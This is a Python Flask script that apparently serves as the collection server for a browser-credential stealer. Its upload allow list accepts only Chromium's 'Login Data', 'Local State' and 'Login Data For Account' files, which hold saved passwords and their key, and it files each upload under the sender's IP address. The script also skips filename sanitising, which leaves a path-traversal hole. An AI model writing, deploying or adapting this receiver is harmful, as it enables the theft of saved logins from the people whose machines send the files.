import os
from flask import Flask, request, redirect, url_for
from werkzeug.utils import secure_filename
from flask import send_from_directory
from urllib.parse import unquote
from colorama import Fore, Back, Style

app = Flask(__name__)

# Windows
UPLOAD_FOLDER = 'upload'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)
if os.name == 'nt':
    UPLOAD_FOLDER += '\\'
else:
    UPLOAD_FOLDER += '/'
print(UPLOAD_FOLDER)

ALLOWED_EXTENSIONS = set(['bak'])

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def successPrint(msg):
    print(Fore.BLACK + Back.GREEN + msg + Style.RESET_ALL)

def allowed_file(filename):
    if filename in ["Login Data","Local State","Login Data For Account"]:
        return True
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if not os.path.exists(UPLOAD_FOLDER + request.remote_addr):
        os.makedirs(UPLOAD_FOLDER + request.remote_addr)
    if request.method == 'POST':
        file = request.files['file']
        if file and allowed_file(file.filename):
            #filename = secure_filename(file.filename)
            filename = unquote(file.filename).replace(".bak","")
            successPrint("Upload File [" + request.remote_addr + "]: " +  filename )
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], request.remote_addr + '/' + filename))
            #return redirect(url_for('uploaded_file', filename=filename))
    return ''
    '''
    <!doctype html>
    <title>Upload new File</title>
    <h1>Upload new File</h1>
    <form action="" method=post enctype=multipart/form-data>
      <p><input type=file name=file>
         <input type=submit value=Upload>
    </form>
    '''
"""
# View file on web
@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
"""

if __name__ == "__main__":
    app.run(host="0.0.0.0",port="8000",debug=True)

